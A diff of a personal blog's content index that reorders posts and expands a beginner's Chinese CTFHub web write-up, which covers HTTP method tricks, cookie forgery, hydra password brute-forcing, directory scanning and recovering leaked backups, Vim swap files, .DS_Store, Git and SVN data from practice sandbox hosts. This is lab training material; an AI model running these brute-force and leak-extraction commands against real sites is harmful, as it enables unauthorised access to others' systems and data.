@@ -358,6 +358,606 @@ Archlinux 无法上网
       </tags>
   </entry>
   <entry>
+    <title>CTFHub 小白题目练习_Web 篇</title>
+    <url>/article/44884/</url>
+    <content><![CDATA[0. 前言
+本人 CTF 新手，因为打算学网络空间安全专业所以开始接触 CTF, 初中就对网络安全慕名，看过一些 geekpwn 但是没有深入下去，接着这个升大学前的暑假练练 CTF, 以下是我对 CTFHub 技能树上的题的简短 Writeup
+我觉得动手实操一遍会很有用，所以我的所有 Writeup 不会透露任何的flag
+1.Web 前置技能 ——Http 协议
+1-1. 请求方式
+
+题目说明
+HTTP 请求方法, HTTP / 1.1 协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。
+
+
+知识补充
+HTTP / 1.1 协议的八种方法
+
+
+
+方法名
+含义
+
+
+
+
+GET
+获取资源
+
+
+HEAD
+获取资源头部（无响应体）
+
+
+POST
+提交数据、创建 / 处理资源
+
+
+PUT
+上传 / 替换整个资源
+
+
+DELETE
+删除资源
+
+
+CONNECT
+建立隧道连接（如代理 HTTPS）
+
+
+OPTIONS
+获取目标资源支持的通信选项
+
+
+TRACE
+回显服务器收到的请求（诊断）
+
+
+
+
+网站也可以自定义协议 (例如本题)
+这道例题要求我们使用CTF**B的方法来获取 flag, 可以猜出方法名应该是CTFHUB
+直接使用curl
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   curl -X CTFHUB http://challenge-xxx.sandbox.ctfhub.com:10800 
+于是我们得到 flag
+1-2.302 跳转
+
+题目说明
+HTTP 临时重定向
+
+
+知识补充
+浏览器收到302后，会自动跳转到响应头Location里指定的新URL，整个过程对用户来说通常是无感知的。
+
+打开题目，点击 flag 链接，发现被重定向到了原来的界面，按下fn +F12，打开开发者工具，发现这个链接指向的是..../index.php
+故技重施，尝试用curl
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   curl -X GET http://challenge-xxx.sandbox.ctfhub.com:10800/index.php 
+于是我们得到 flag
+1-3.Cookie
+
+题目说明
+Cookie 欺骗、认证、伪造
+
+打开题目发现要求 admin, 打开开发者工具，找到应用 -&gt;Cookie,打开会发现有一个admin项，将它的值改为1，刷新网站即可得到 flag
+1-4. 基础认证
+
+题目说明
+在 HTTP 中，基本认证（英语：Basic access authentication）是允许 http 用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。详情请查看 https://zh.wikipedia.org/wiki/HTTP 基本认证
+
+下载附件，得到一份密码字典
+打开题目，发现跳转 flag 需要认证, 猜测用户名为 admin
+拿出我们的九头蛇hydra
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   hydra -l admin -P 10_million_password_list_top_100.txt http://challenge-xxx.sandbox.ctfhub.com:10800 -s 10800 http-get /flag.html 
+得到密码，认证成功，于是我们得到 flag
+1-5. 响应包源代码查看
+最简单的一道题，fn+F12 自个扒拉去吧
+或者使用
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   curl -v http://challenge-xxx.sandbox.ctfhub.com:10800 | grep flag 
+2. 信息泄露
+2-1. 目录遍历
+打开题目，发现里面有多层嵌套的文件夹，我们猜里面有一个文件名和 flag 相关
+随便点进去几个文件夹，发现都是以 1,2,3,4 这终端字符串命名的，普通字典不好使
+生成字典
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   bash -c "printf '%s\n' {0..9} &gt; /tmp/dict.txt"echo flag &gt;&gt; /tmp/dic.txt 
+开始遍历
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   dirsearch -u http://challenge-xxx.sandbox.ctfhub.com:10800/flag_in_here/ -w /tmp/dict.txt -r 
+之后去report/question_website/找生成的报告，在浏览器里读取文件内容即可
+2-2.PHPINFO
+难度和 1-5 放一起
+打开题目，查看phpinfo,在ENVIRONMENT项可以看到FLAG和对应的值
+2-3. 备份文件下载
+
+题目说明
+当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。
+
+2-3-1. 网站源码
+看到题目描述, 可以猜到应该和 2-1 是一个套路，找目录里面的文件
+根据题目提示生成字典文件
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   echo -e web\nwebsite\nback\nbackup\nwww\nwwwroot\ntemp &gt; dict.txt 
+扫文件,dirsearch因未知原因扫不出文件
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   feroxbuster -u http://challenge-xxx.sandbox.ctfhub.com:10800 -w dict.txt -x tar,tar.gz,rar,zip 
+可以扫到备份压缩包，解压后得到flag.... 但真的是flag吗？
+发现flag文件中是Where is flag??
+意识到这是网站的备份，我们可以尝试直接访问http://challenge-xxx.sandbox.ctfhub.com:10800/flag_2061830417.txt，或者curl这个网址得到真正的flag
+2-3-2.bak 文件
+根据题目描述，访问http://challenge-xxx.sandbox.ctfhub.com:10800/index.php，fn+F12 查看源代码没有发现任何的 flag, 使用 feroxbuster 也扫不到备份文件，考虑备份文件可能是以它本身命名的，而不是压缩包
+尝试curl题目http://challenge-xxx.sandbox.ctfhub.com:10800/index.php.bak得到flag
+2-3-3.vim 缓存
+
+知识补充
+当你用 Vim 编辑文件时（比如 vim index.php），Vim 会在同目录下创建一个交换文件：
+.index.php.swp
+.index.php.swo（如果 .swp 已存在）
+.index.php.swn（编号递增）
+正常情况下，保存退出后 Vim 会删除交换文件。但如果发生崩溃 / 断电，终端断开，强制关闭，交换文件就会残留在服务器上，攻击者可以直接下载并恢复出原始文件内容。
+
+根据题目提示和已有信息, 尝试 curlhttp://challenge-xxx.sandbox.ctfhub.com:10800/.index.php.swp 成功
+执行来恢复文件
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   vim -r .index.php.swp 
+发现无法保存，问题是目标路径不存在，执行
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   mkdir /tmp/skill_web_info_leak_backup_vim/src/ -p 
+再次执行
+执行来恢复文件
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   vim -r .index.php.swp 
+之后访问这个文件应该就可以得到flag，但是我这里得到的 flag 是残缺不全的，应该是编码问题
+
+尝试直接阅读.index.php.swp，或者使用
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   strings .index.php.swp 
+便可读出flag
+2-3-4..DS_Store
+
+题目说明
+.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store 可以知道这个目录里面所有文件的清单。
+
+打开题目, 根据以往的做题经验，这个时候应该请出我们的老工具feroxbuster还有旧字典来扫一下网站
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   feroxbuster -u http://challenge-xxx.sandbox.ctfhub.com:10800 -w dict.txt -x .DS_Store 
+得到地址，curl下来
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   curl TARGET_FILE_ON_WEBSITE -o .DS_Store 
+可以使用file命令确认一下这是苹果系统的文件而不是什么奇奇怪怪的东西
+接下来我们要使用pip来安装ds_store包
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   pip install ds-store 
+
+致 Arch 系用户
+众嗦粥知，Arch 大人的系统包目录 python 是万万碰不得的，我们需要创建虚拟环境，建议在特定的目录下执行
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   python -m venv .venvsource .venv/bin/activate.fish #根据你自己的实际shell替换掉fish，之后要用到这个环境的时候直接执行这个命令就好了pip install ds-store 
+
+写一个简单的 python 脚本，用来解析我们刚刚获得的.DS_Store，我起个名a.py
+ 
+    
+      
+      
+      
+    
+    PYTHON
+  
+    
+   from ds_store import DSStorewith DSStore.open('.DS_Store', 'r') as d:    for filename in d:        print(filename) 
+之后python a.py即可看到其中的文件目录，使用curl即可得到flag
+2-4.Git 泄漏
+
+题目说明
+当前大量开发人员使用 git 进行版本控制，对站点自动部署。如果配置不当, 可能会将.git 文件夹直接部署到线上环境。这就引起了 git 泄露漏洞。请尝试使用 BugScanTeam 的 GitHack 完成本题
+
+根据题目信息，我们要用GitHacker工具，BugScanTeam的工具是基于python2实现的，使用现代的python3会出现依赖问题，我们用PyPI中含有的同名工具，让我们用杀千刀的pip
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   pip install GitHacker 
+
+致 Arch 用户
+如果你已经在2-3-4配置好了虚拟环境
+直接在你之前选择的目录执行
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   source .venv/bin/activate.fish #根据你自己的实际shell替换掉fishpip install GitHacker 
+
+2-4-1.LOG
+出题人对仓库的操作会被记录到LOG中
+尝试遍历下载 git 仓库
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   githacker --url http://challenge-xxx.sandbox.ctfhub.com:10800 --output-folder outrepo` 
+进入outrepo目录，发现里面有一个以很长字符串命名的文件夹，进入，尝试查看git提交记录
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   git log 
+找到add flag的commit,记为$COMMIT
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   git show $COMMIT 
+于是便可看到flag
+2-4-2.Stash
+stash为git的暂存区，出题人把flag写进文件后git stash藏起来了
+尝试遍历下载 git 仓库
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   githacker --url http://challenge-xxx.sandbox.ctfhub.com:10800 --output-folder outrepo1 
+进入到outrepo1中的长字符串文件夹, 尝试查看stash暂存区内容
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   git stash list 
+应该会有这种输出
+ 
+    
+      
+      
+      
+    
+    
+  
+    
+   stash@{0}: WIP on master: 0590b0e add flag 
+执行
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   git stash show -p stash@{0} 
+便可得到flag
+2-4-3.index
+index也是git的暂存区，index记录了当前工作区有哪些文件、它们的哈希值、权限等信息
+
+stash 和 index 的区别
+Index 是 "准备提交的清单文件"，Stash 是 "临时藏起来的修改"。CTF 里 index 泄露文件名，stash 泄露被隐藏的内容（flag）。
+
+尝试遍历下载 git 仓库
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   githacker --url http://challenge-xxx.sandbox.ctfhub.com:10800 --output-folder outrepo2 
+进入outrepo2中的长字符串文件夹, 可以看到flag直接就躺在你眼前了 (一个 txt 文档)
+哈哈，是有些简单了
+一般的题目需要使用这个命令来看暂存区中的文件列表，flag可能是他们的文件名拼凑而成的
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   git ls-files --stage 
+2-5.SVN 泄漏
+
+题目说明
+当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当, 可能会将.svn 文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。
+
+
+知识补充
+SVN 的元数据存放在 .svn/ 目录里，核心文件是 wc.db（SQLite 数据库）和 entries 文件。
+
+执行
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   curl http://challenge-xxx.sandbox.ctfhub.com:10800/.svn/wc.db --output wc.db 
+查看这个db数据库
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   sqlite3 wc.db "SELECT local_relpath, checksum FROM NODES" 
+发现flag,但他的checksum为NULL，说明当前版本没有缓存，照应了题目文件在旧版本
+查看数据库中的所有表类型
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   sqlite3 wc.db ".tables" 
+发现PRISTINE,查看PRISTINE表，这记录了所有被缓存的文件对象
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   sqlite3 wc.db "SELECT checksum, size FROM PRISTINE" 
+得到了另一个未知文件的sha1值，猜他就是flag对应文件的sha1,尝试从PRISTINE恢复文件
+pristine/的目录结构为
+ 
+    
+      
+      
+      
+    
+    
+  
+    
+   .svn/pristine/xx/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.svn-base 
+xx为sha1前两位，xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx为完整的sha1
+尝试curl，得到flag
+ 
+    
+      
+      
+      
+    
+    SHELL
+  
+    
+   curl http://challenge-xxx.sandbox.ctfhub.com:10800/.svn/pristine/xx/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.svn-base 
+2-6.HG 泄漏
+当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当, 可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。
+记得改评论区为 github 类型的
+]]></content>
+      <categories>
+        <category>CTFWriteup</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Writeup</tag>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ToolBox—— 闲时做的一款多功能工具箱</title>
+    <url>/article/37988/</url>
+    <content><![CDATA[前引
+在 2022 年三月份，由于疫情，作者在家上的网课，课间闲来无事，想做一个 batch 程序自己玩玩，但是这程序越写越上瘾，最后的主程序差不多写了七百多行 (其实里面没有什么高难度的东西) 我寻思着独乐乐不如众乐乐，正好我有一个个人博客，干脆就发上面吧，有需要的或者想要研究的在页面底下自取
+注意！！！本程序不盈利，毕竟有一部分 (万能手机驱动，运行库，民间搜罗到的游戏) 不是我自己写的
+
+
+本程序都能干些什么？
+1.adb 相关工具
+1.1 相关运行库以及万能手机驱动的安装
+1.2 各种重启
+1.3 运行 shell
+1.4 恢复出厂
+1.5 安装 busybox
+1.6 scrcpy
+1.7 oem 解锁
+1.8 fastboot 刷机
+1.9 magisk 修补 boot 方式安装
+1.10 sideload 线刷
+2. 一些民间搜罗到的游戏
+2.1 井字棋
+2.2 勇士大闯关
+2.3 反恐金人
+2.4 寻宝
+2.5 梦幻西游
+2.6 米币冒险
+2.7 记忆游戏
+2.8 谜之拼图
+2.9 赌马场
+还有一些小工具，比如混淆代码，呼出 cmd 窗口，后面还会持续更新: D
+点击下面链接下载
+Toolbox-v1.8.1.8
+提取码: 1024
+网页端历史版本
+]]></content>
+      <categories>
+        <category>Tech</category>
+      </categories>
+      <tags>
+        <tag>Program</tag>
+        <tag>batch</tag>
+        <tag>adb</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Archlinux 使用过程遇到的一些坑</title>
     <url>/article/23109/</url>
     <content><![CDATA[Archlinux 使用过程遇到的一些问题
@@ -430,428 +1030,6 @@ Archlinux 无法上网
       <tags>
         <tag>Tech</tag>
         <tag>Archlinu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ToolBox—— 闲时做的一款多功能工具箱</title>
-    <url>/article/37988/</url>
-    <content><![CDATA[前引
-在 2022 年三月份，由于疫情，作者在家上的网课，课间闲来无事，想做一个 batch 程序自己玩玩，但是这程序越写越上瘾，最后的主程序差不多写了七百多行 (其实里面没有什么高难度的东西) 我寻思着独乐乐不如众乐乐，正好我有一个个人博客，干脆就发上面吧，有需要的或者想要研究的在页面底下自取
-注意！！！本程序不盈利，毕竟有一部分 (万能手机驱动，运行库，民间搜罗到的游戏) 不是我自己写的
-
-
-本程序都能干些什么？
-1.adb 相关工具
-1.1 相关运行库以及万能手机驱动的安装
-1.2 各种重启
-1.3 运行 shell
-1.4 恢复出厂
-1.5 安装 busybox
-1.6 scrcpy
-1.7 oem 解锁
-1.8 fastboot 刷机
-1.9 magisk 修补 boot 方式安装
-1.10 sideload 线刷
-2. 一些民间搜罗到的游戏
-2.1 井字棋
-2.2 勇士大闯关
-2.3 反恐金人
-2.4 寻宝
-2.5 梦幻西游
-2.6 米币冒险
-2.7 记忆游戏
-2.8 谜之拼图
-2.9 赌马场
-还有一些小工具，比如混淆代码，呼出 cmd 窗口，后面还会持续更新: D
-点击下面链接下载
-Toolbox-v1.8.1.8
-提取码: 1024
-网页端历史版本
-]]></content>
-      <categories>
-        <category>Tech</category>
-      </categories>
-      <tags>
-        <tag>Program</tag>
-        <tag>batch</tag>
-        <tag>adb</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTFHub 小白题目练习_Web 篇</title>
-    <url>/article/44884/</url>
-    <content><![CDATA[0. 前言
-本人 CTF 新手，因为打算学网络空间安全专业所以开始接触 CTF, 初中就对网络安全慕名，看过一些 geekpwn 但是没有深入下去，接着这个升大学前的暑假练练 CTF, 以下是我对 CTFHub 技能树上的题的简短 Writeup
-我觉得动手实操一遍会很有用，所以我的所有 Writeup 不会透露任何的flag
-1.Web 前置技能 ——Http 协议
-1-1. 请求方式
-
-题目说明
-HTTP 请求方法, HTTP / 1.1 协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。
-
-
-知识补充
-HTTP / 1.1 协议的八种方法
-
-
-
-方法名
-含义
-
-
-
-
-GET
-获取资源
-
-
-HEAD
-获取资源头部（无响应体）
-
-
-POST
-提交数据、创建 / 处理资源
-
-
-PUT
-上传 / 替换整个资源
-
-
-DELETE
-删除资源
-
-
-CONNECT
-建立隧道连接（如代理 HTTPS）
-
-
-OPTIONS
-获取目标资源支持的通信选项
-
-
-TRACE
-回显服务器收到的请求（诊断）
-
-
-
-
-网站也可以自定义协议 (例如本题)
-这道例题要求我们使用CTF**B的方法来获取 flag, 可以猜出方法名应该是CTFHUB
-直接使用curl
- 
-    
-      
-      
-      
-    
-    SHELL
-  
-    
-   curl -X CTFHUB question_website:PORT 
-于是我们得到 flag
-1-2.302 跳转
-
-题目说明
-HTTP 临时重定向
-
-
-知识补充
-浏览器收到302后，会自动跳转到响应头Location里指定的新URL，整个过程对用户来说通常是无感知的。
-
-打开题目，点击 flag 链接，发现被重定向到了原来的界面，按下fn +F12，打开开发者工具，发现这个链接指向的是..../index.php
-故技重施，尝试用curl
- 
-    
-      
-      
-      
-    
-    SHELL
-  
-    
-   curl -X GET question_php 
-于是我们得到 flag
-1-3.Cookie
-
-题目说明
-Cookie 欺骗、认证、伪造
-
-打开题目发现要求 admin, 打开开发者工具，找到应用 -&gt;Cookie,打开会发现有一个admin项，将它的值改为1，刷新网站即可得到 flag
-1-4. 基础认证
-
-题目说明
-在 HTTP 中，基本认证（英语：Basic access authentication）是允许 http 用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。详情请查看 https://zh.wikipedia.org/wiki/HTTP 基本认证
-
-下载附件，得到一份密码字典
-打开题目，发现跳转 flag 需要认证, 猜测用户名为 admin
-拿出我们的九头蛇hydra
- 
-    
-      
-      
-      
-    
-    SHELL
-  
-    
-   hydra -l admin -P 10_million_password_list_top_100.txt question_website -s 10800 http-get /flag.html 
-得到密码，认证成功，于是我们得到 flag
-1-5. 响应包源代码查看
-最简单的一道题，fn+F12 自个扒拉去吧
-或者使用
- 
-    
-      
-      
-      
-    
-    SHELL
-  
-    
-   curl -v question_website:PORT | grep flag 
-2. 信息泄露
-2-1. 目录遍历
-打开题目，发现里面有多层嵌套的文件夹，我们猜里面有一个文件名和 flag 相关
-随便点进去几个文件夹，发现都是以 1,2,3,4 这终端字符串命名的，普通字典不好使
-生成字典
- 
-    
-      
-      
-      
-    
-    SHELL
-  
-    
-   bash -c "printf '%s\n' {0..9} &gt; /tmp/dict.txt"echo flag &gt;&gt; /tmp/dic.txt 
-开始遍历
- 
-    
-      
-      
-      
-    
-    SHELL
-  
-    
-   dirsearch -u question_website:PORT/flag_in_here/ -w /tmp/dict.txt -r 
-之后去report/question_website/找生成的报告，在浏览器里读取文件内容即可
-2-2.PHPINFO
-难度和 1-5 放一起
-打开题目，查看phpinfo,在ENVIRONMENT项可以看到FLAG和对应的值
-2-3. 备份文件下载
-
-题目说明
-当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。
-
-2-3-1. 网站源码
-看到题目描述, 可以猜到应该和 2-1 是一个套路，找目录里面的文件
-根据题目提示生成字典文件
- 
-    
-      
-      
-      
-    
-    SHELL
-  
-    
-   echo -e web\nwebsite\nback\nbackup\nwww\nwwwroot\ntemp &gt; dict.txt 
-扫文件,dirsearch因未知原因扫不出文件
- 
-    
-      
-      
-      
-    
-    SHELL
-  
-    
-   feroxbuster -u question_website:PORT -w dict.txt -x tar,tar.gz,rar,zip 
-可以扫到备份压缩包，解压后得到flag.... 但真的是flag吗？
-发现flag文件中是Where is flag??
-意识到这是网站的备份，我们可以尝试直接访问question_website:PORT/flag_2061830417.txt，或者curl这个网址得到真正的flag
-2-3-2.bak 文件
-根据题目描述，访问question_website:PORT/index.php，fn+F12 查看源代码没有发现任何的 flag, 使用 feroxbuster 也扫不到备份文件，考虑备份文件可能是以它本身命名的，而不是压缩包
-尝试curl题目question_website:PORT/index.php.bak得到flag
-2-3-3.vim 缓存
-
-知识补充
-当你用 Vim 编辑文件时（比如 vim index.php），Vim 会在同目录下创建一个交换文件：
-.index.php.swp
-.index.php.swo（如果 .swp 已存在）
-.index.php.swn（编号递增）
-正常情况下，保存退出后 Vim 会删除交换文件。但如果发生崩溃 / 断电，终端断开，强制关闭，交换文件就会残留在服务器上，攻击者可以直接下载并恢复出原始文件内容。
-
-根据题目提示和已有信息, 尝试 curlquestion_website:PORT/.index.php.swp 成功
-执行来恢复文件
- 
-    
-      
-      
-      
-    
-    SHELL
-  
-    
-   vim -r .index.php.swp 
-发现无法保存，问题是目标路径不存在，执行
- 
-    
-      
-      
-      
-    
-    SHELL
-  
-    
-   mkdir /tmp/skill_web_info_leak_backup_vim/src/ -p 
-再次执行
-执行来恢复文件
- 
-    
-      
-      
-      
-    
-    SHELL
-  
-    
-   vim -r .index.php.swp 
-之后访问这个文件应该就可以得到flag，但是我这里得到的 flag 是残缺不全的，应该是编码问题
-
-尝试直接阅读.index.php.swp，或者使用
- 
-    
-      
-      
-      
-    
-    SHELL
-  
-    
-   strings .index.php.swp 
-便可读出flag
-2-3-4..DS_Store
-
-题目说明
-.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store 可以知道这个目录里面所有文件的清单。
-
-打开题目, 根据以往的做题经验，这个时候应该请出我们的老工具feroxbuster还有旧字典来扫一下网站
- 
-    
-      
-      
-      
-    
-    SHELL
-  
-    
-   feroxbuster -u question_website:PORT -w dict.txt -x .DS_Store 
-得到地址，curl下来
- 
-    
-      
-      
-      
-    
-    SHELL
-  
-    
-   curl TARGET_FILE_ON_WEBSITE -o .DS_Store 
-可以使用file命令确认一下这是苹果系统的文件而不是什么奇奇怪怪的东西
-接下来我们要使用pip来安装ds_store包
- 
-    
-      
-      
-      
-    
-    SHELL
-  
-    
-   pip install ds-store 
-
-致 Arch 系用户
-众嗦粥知，Arch 大人的系统包目录 python 是万万碰不得的，我们需要创建虚拟环境，建议在特定的目录下执行
- 
-    
-      
-      
-      
-    
-    SHELL
-  
-    
-   python -m venv .venvsource .venv/bin/activate.fish #根据你自己的实际shell替换掉fish，之后要用到这个环境的时候直接执行这个命令就好了pip install ds-store 
-
-写一个简单的 python 脚本，用来解析我们刚刚获得的.DS_Store，我起个名a.py
- 
-    
-      
-      
-      
-    
-    PYTHON
-  
-    
-   from ds_store import DSStorewith DSStore.open('.DS_Store', 'r') as d:    for filename in d:        print(filename) 
-之后python a.py即可看到其中的文件目录，使用curl即可得到flag
-2-4.Git 泄漏
-
-题目说明
-当前大量开发人员使用 git 进行版本控制，对站点自动部署。如果配置不当, 可能会将.git 文件夹直接部署到线上环境。这就引起了 git 泄露漏洞。请尝试使用 BugScanTeam 的 GitHack 完成本题
-
-根据题目信息，我们来下载GitHacker工具，BugScanTeam的工具是基于python2实现的，使用现代的 python3 会出现以来问题，我们用pypl中含有的同名工具，让我们用到杀千刀的pip
- 
-    
-      
-      
-      
-    
-    SHELL
-  
-    
-   pip install GitHacker 
-
-致 Arch 用户
-如果你已经在2-3-4配置好了虚拟环境
-直接在你之前选择的目录执行
- 
-    
-      
-      
-      
-    
-    SHELL
-  
-    
-   source .venv/bin/activate.fish #根据你自己的实际shell替换掉fishpip install GitHacker 
-
-之后尝试遍历
- 
-    
-      
-      
-      
-    
-    SHELL
-  
-    
-   githacker --url http://challenge-5132a77561e05bcc.sandbox.ctfhub.com:10800/ --output-folder outrepo 
-2-4-1.LOG
-2-4-2.Stash
-2-4-3.index
-记得改评论区为 github 类型的
-该死的目录又打不开了
-]]></content>
-      <categories>
-        <category>CTFWriteup</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Writeup</tag>
-        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
